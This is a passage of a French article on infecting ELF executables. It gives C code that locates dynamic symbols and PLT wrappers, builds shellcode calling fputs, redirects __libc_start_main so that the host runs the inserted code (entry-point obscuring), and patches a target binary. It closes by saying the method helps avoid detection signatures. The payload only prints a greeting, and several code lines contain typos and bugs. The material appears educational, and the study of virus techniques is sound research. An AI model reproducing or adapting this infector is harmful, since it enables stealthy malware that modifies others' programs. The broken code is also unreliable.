+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define STR_DYNSTR&nbsp; &nbsp; &nbsp; &quot;.dynstr&quot;</span><br />
+<span style="color: #339933;">#define STR_SYMTAB&nbsp; &nbsp; &nbsp; &quot;.dynsym&quot;</span><br />
+<span style="color: #808080; font-style: italic;">/* Symbole depuis son nom */</span><br />
+Elf32_Sym get_dyn<span style="color: black;">&#40;</span>FILE<span style="color: #339933;">*</span> fp<span style="color: #339933;">,</span> Elf32_Ehdr hdr<span style="color: #339933;">,</span> <span style="color: #993333;">char</span><span style="color: #339933;">*</span> symbol<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Récupérer l'index du nom du symbol */</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Shdr sec <span style="color: #339933;">=</span> get_shdr<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> STR_DYNSTR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word strdx <span style="color: #339933;">=</span> getstrdx<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> sec<span style="color: #339933;">,</span> symbol<span style="color: #339933;">,</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strlen.html"><span style="color: #000066;">strlen</span></a><span style="color: black;">&#40;</span>symbol<span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; sec <span style="color: #339933;">=</span> get_shdr<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> STR_SYMTAB<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> sec.<span style="color: #202020;">sh_offset</span><span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Récupérer le symbol */</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Sym sym<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word symdx <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word i<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> sec.<span style="color: #202020;">sh_size</span><span style="color: #339933;">;</span> i <span style="color: #339933;">+=</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Sym<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #339933;">++</span>symdx<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>sym<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Sym<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>sym.<span style="color: #202020;">st_name</span> <span style="color: #339933;">==</span> strdx<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Repacement de l'index dans la table */</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* par l'index du symbol par commodité HACK */</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sym.<span style="color: #202020;">st_name</span> <span style="color: #339933;">=</span> symndx<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> sym<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fprintf.html"><span style="color: #000066;">fprintf</span></a><span style="color: black;">&#40;</span>stderr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;Le symbol %s n'est pas référencé<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> symbol<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+&nbsp;</div>
+<h4><a name="c323"></a>Les emballages de fonction</h4>
+<p>Les emballages de la section <em>.plt</em> sont associés aux symboles de procédures par l'intermédiaire de la table de relation des redirections <em>.rel.plt</em>. Les éléments de cette table sont décrit par le type <em>Elf32_Rel</em>. Cette structure possède deux champs.</p>
+<ul>
+	<li><em>r_info</em> dont les 8 bits de poids fort contiennent l'index du symbole emballé.</li>
+	<li><em>r_offset</em> qui contient l'entrée de la table <em>.got</em> correspondant au symbole.</li>
+</ul>
+<p>Les emballages de la table <em>.plt</em> sont des codes assembleurs ayant la structure suivante.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #339933;">*</span>name1_in_got<br />
+&nbsp; &nbsp; &nbsp; &nbsp; pushl &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e58a8383968091a5b5a6">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br />
+&nbsp;</div>
+<p>Ainsi, nous pouvons accéder à l'emballage d'un symbole grâce à la procédure suivante.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #339933;">#define STR_RELPLT&nbsp; &nbsp; &nbsp; &quot;.rel.plt&quot;</span><br />
+<span style="color: #339933;">#define STR_PLT &nbsp; &nbsp; &nbsp; &nbsp; &quot;.plt&quot;</span><br />
+<span style="color: #339933;">#define JMPM32_OFF&nbsp; &nbsp; &nbsp; 2</span><br />
+<span style="color: #339933;">#define JMPM32_SIZE &nbsp; &nbsp; 6</span><br />
+<span style="color: #993333;">char</span>&nbsp; &nbsp; JMPM32_OPC<span style="color: black;">&#91;</span>JMPM32_SIZE<span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">&quot;<span style="color: #660099; font-weight: bold;">\xff</span><span style="color: #660099; font-weight: bold;">\x25</span>@@@@&quot;</span><span style="color: #339933;">;</span><br />
+<span style="color: #808080; font-style: italic;">/* rechercher un emballage */</span><br />
+Elf32_Off get_wrapper<span style="color: black;">&#40;</span>FILE<span style="color: #339933;">*</span> fp<span style="color: #339933;">,</span> Elf32_Ehdr hdr<span style="color: #339933;">,</span> <span style="color: #993333;">char</span><span style="color: #339933;">*</span> symbol<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Sym <span style="color: #339933;">=</span> get_sym<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> symbol<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Shdr rel <span style="color: #339933;">=</span> get_shdr<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> STR_RELPLT<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> rel.<span style="color: #202020;">sh_offset</span><span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Rel rel<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word i<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> rel.<span style="color: #202020;">sh_size</span><span style="color: #339933;">;</span> <span style="color: #339933;">++</span>i<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>rel<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_rel<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ELF32_R_SYM<span style="color: black;">&#40;</span>rel.<span style="color: #202020;">r_info</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> sym.<span style="color: #202020;">st_name</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span>JMPM32_OPC <span style="color: #339933;">+</span> JMP32_OFF<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>rel.<span style="color: #202020;">r_offset</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Addr<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Elf32_Shdr plt <span style="color: #339933;">=</span> get_shdr<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> STR_PLT<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> plt.<span style="color: #202020;">sh_offset</span> <span style="color: #339933;">+</span> get_strdx<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> plt<span style="color: #339933;">,</span> JMPM32_OPC<span style="color: #339933;">,</span> JMPM32_SIZE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fprintf.html"><span style="color: #000066;">fprintf</span></a><span style="color: black;">&#40;</span>stderr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;Le symbol de fonction %s (%x) n'est pas emballé<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> symbol<span style="color: #339933;">,</span> sym.<span style="color: #202020;">st_name</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+&nbsp;</div>
+<h3><a name="c33"></a>Insertion et liaison</h3>
+<p>Nous reprenons le principe de la première insertion mais en liant le code inséré avec le programme hôte. Le code réalisera la même fonction, cest-à-dire imprimer "Bonjour" sur la sortie standard. Mais au lieu de d'exécuter une interruption, il fera appel à la procédure standard <em>fputs</em> et à la variable globale <em>stdout</em>. Ceci constitue un excellent exercice pour comprendre le mécanisme de liaison dynamique.</p>
+<src lang='c">
+#define	SHC_SIZE	128
+#define	SHC_STDOUT	"stdout"
+#define	SHC_FPUTS	"fputs"
+#define	SHC_MSG		"Bonsoir\n"
+/* Allouer et créer le shellcode, retourner son adresse */
+char* setup_shellcode(FILE* fp, Elf32_Ehdr hdr, Elf32_Addr shc_addr, Elf32_Off shc_off, Elf32_Addr retadd) {
+	char* code = (char*)malloc(SHC_SIZE + strlen(SHC_MSG) * sizeof(char));
+	Elf32_off cpt = 0;
+	/* put wrapper */
+	*(Elf32_Addr*)(code + cpt) = shc_addr + sizeof(Elf32_Addr);
+	cpt += sizeof(Elf32_Addr);
+	/* mox eax [retadd] */
+	code[cpt++] = '\xa1';
+	memcpy(code + cpt, &retadd, sizeof(Elf32_Addr));
+	cpt += sizeof(Elf32_Addr);
+	/* push eax */
+	code[cpt++] = '\x50'
+	/* mov eax [stdout] */
+	code[cpt++] = '\xa1';
+	Elf32_Addr sym_stdout = get_sym(fp, hdr, SHC_STDOUT).st_value;
+	memcpy(code + cpt, &sym_stdout, sizeof(Elf32_Addr));
+	cpt += sizeof(Elf32_Addr);
+	/* push eax */
+	code[cpt++] = '\x50\;
+	/* push message */
+	code[cpt++] = '\x68';
+	Elf32_Addr msg = shc_addr + SHC_SIZE;
+	memcpy(code + cpt, &msg, sizeof(Elf32_Addr));
+	cpt += sizeof(Elf32_Addr);
+	/* call fput */
+	code[cpt++] = '\xe8';
+	Elf32_off fputs = get_wrapper(fp, hdr, SHC_FPUTS);
+	fputs -= (shc_off + cpt + sizeof(Elf32_Addr));
+	memcpy(code + cpt, &fputs, sizeof(Elf32_Addr));
+	cpt += sizeof(Elf32_Addr);
+	/* pop eax */
+	code[cpt++] = '\x58';
+	code[cpt++] = '\x58';
+	/* ret */
+	code[cpt++] = '\xc3';
+	strcpy(code + SHC_SIZE, SHC_MSG);
+	if (cpt > SHC_SIZE) {
+		fprintf(stderr, "Le shellcode est trop long %i / %i\n", cpt, SHC_SIZE);
+		exit(1);
+	}
+	return code;
+}
+</src>
+<p>D'autre part, nous assombrissons le point d'entrée en redirigeant le symbole <em>main</em> sur le code inséré qui rendra le contrôle à <em>main</em> une fois son exécution terminée.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* Insérer EPO */</span><br />
+<span style="color: #339933;">#define STR_TEXT&nbsp; &nbsp; &nbsp; &nbsp; &quot;.text&quot;</span><br />
+<span style="color: #339933;">#define STR_MAIN&nbsp; &nbsp; &nbsp; &nbsp; &quot;__libc_start_main&quot;</span><br />
+Elf32_Addr setup_epo<span style="color: black;">&#40;</span>FILE<span style="color: #339933;">*</span> fp<span style="color: #339933;">,</span> Elf32_Ehdr hdr<span style="color: #339933;">,</span> Elf32_Off shc_wrapper<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/*rechercher EPO_SIZE nop */</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Off off <span style="color: #339933;">=</span> get_wrapper<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> STR_MAIN<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> off<span style="color: #339933;">,</span> SEEK_SET<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/getc.html"><span style="color: #000066;">getc</span></a><span style="color: black;">&#40;</span>fp<span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> <span style="color: #ff0000;">'<span style="color: #660099; font-weight: bold;">\xff</span>'</span> <span style="color: #339933;">&amp;&amp;</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/getc.html"><span style="color: #000066;">getc</span></a><span style="color: black;">&#40;</span>fp<span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> <span style="color: #ff0000;">'<span style="color: #660099; font-weight: bold;">\x25</span>'</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fprintf.html"><span style="color: #000066;">fprintf</span></a><span style="color: black;">&#40;</span>stderr<span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;La forme de l'emballage est inconnue<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/exit.html"><span style="color: #000066;">exit</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr main_wrapper<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>main_wrapper<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Addr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fseek.html"><span style="color: #000066;">fseek</span></a><span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> <span style="color: #339933;">-</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Addr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> SEEK_CUR<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fwrite.html"><span style="color: #000066;">fwrite</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>shc_wrapper<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Addr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> main_wrapper<span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+&nbsp;</div>
+<p>Nous obtenons alors le programme suivant.</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> main<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span><span style="color: #339933;">**</span> argv<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; FILE<span style="color: #339933;">*</span> fp <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fopen.html"><span style="color: #000066;">fopen</span></a><span style="color: black;">&#40;</span>argv<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;rb+&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr hdr<span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fread.html"><span style="color: #000066;">fread</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>hdr<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Ehdr<span style="color: black;">&#41;</span><span style="color: #339933;">,</span> fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Phdr ins_seg <span style="color: #339933;">=</span> find_seg<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr shc_addr <span style="color: #339933;">=</span> ins_seg.<span style="color: #202020;">p_vaddr</span> <span style="color: #339933;">+</span> ins_seg.<span style="color: #202020;">p_filesz</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Off shc_off <span style="color: #339933;">=</span> ins_seg.<span style="color: #202020;">p_offset</span> <span style="color: #339933;">+</span> ins_seg.<span style="color: #202020;">p_filesz</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Off main_wrapper <span style="color: #339933;">=</span> setup_epo<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> shc_addr<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span><span style="color: #339933;">*</span> code <span style="color: #339933;">=</span> setup_shellcode<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> shc_addr<span style="color: #339933;">,</span> shc_off<span style="color: #339933;">,</span> main_wrapper<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; update_header<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> hdr.<span style="color: #202020;">e_entry</span><span style="color: #339933;">,</span> shc_off<span style="color: #339933;">,</span> ins_seg.<span style="color: #202020;">p_align</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; update_seg<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> shc_off<span style="color: #339933;">,</span> ins_seg.<span style="color: #202020;">p_align</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; update_sec<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> hdr<span style="color: #339933;">,</span> shc_off<span style="color: #339933;">,</span> ins_seg.<span style="color: #202020;">p_align</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; insert_shellcode<span style="color: black;">&#40;</span>fp<span style="color: #339933;">,</span> shc_off<span style="color: #339933;">,</span> ins_seg.<span style="color: #202020;">p_align</span><span style="color: #339933;">,</span> code<span style="color: #339933;">,</span> SHC_SIZE <span style="color: #339933;">+</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strlen.html"><span style="color: #000066;">strlen</span></a><span style="color: black;">&#40;</span>SHC_MSG<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/free.html"><span style="color: #000066;">free</span></a><span style="color: black;">&#40;</span>code<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/fclose.html"><span style="color: #000066;">fclose</span></a><span style="color: black;">&#40;</span>fp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br />
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br />
+<span style="color: black;">&#125;</span><br />
+&nbsp;</div>
+<h2><a name="c4"></a>Conclusion</h2>
+<p>La partie précédente montre qu'il est possible d'insérer un code dans un programme hôte tout en profitant des liaisons dynamiques. Cette méthode permet une plus grande discrétion et rend plus difficile la constitution d'une signature. Il est important de noter que la technique d'insertion de code exposée ici pourrait être réalisée par un usage détourné de tout éditeur de liens, comme <em>ld</em> par exemple. Cet aspect rend d 'utant plus claire la correspondance entre les techniques virales et les techniques de compilation.</p>
+<p>Au vu de cet exposé, on comprend qu'il serait vain de vouloir consolider le format ELF vis-à-vis des infections viraies. En effet, ce format a été pensé pour faciliter la liaison des objets qu'il peut représenter, or l'insertion de code est un pendant du mécanisme de liaison. En d'autre termes, il serait difficile, si ce n'est impossible, d'interdire l'insertion de code tout en préservant les facilites de liaison. On conclu que tout système de protection contre les infections devra se situera à un autre niveau.</p>
+<h2><a name="c5"></a>Bibliographie</h2>
+<ol>
+	<li>A. Bartolich, <a href="/lib/vab00.html">The ELF Virus Writing HOWTO</a>, 2003</li>
+	<li>E. Filiol, Les virus informatiques: théorie, pratique, et applications. Editions Springer, collection IRIS, 2005</li>
+	<li>E. Filiol, Techniques virales avancées, Editions Springer, collection IRIS, 2007</li>
+	<li>G. Bonfanlie, M. Kaczmarek and J.-Y. Marion, A Classification of Viruses through Recursion Theorems, LNCS, CIE'07, Sienna, June 2007</li>
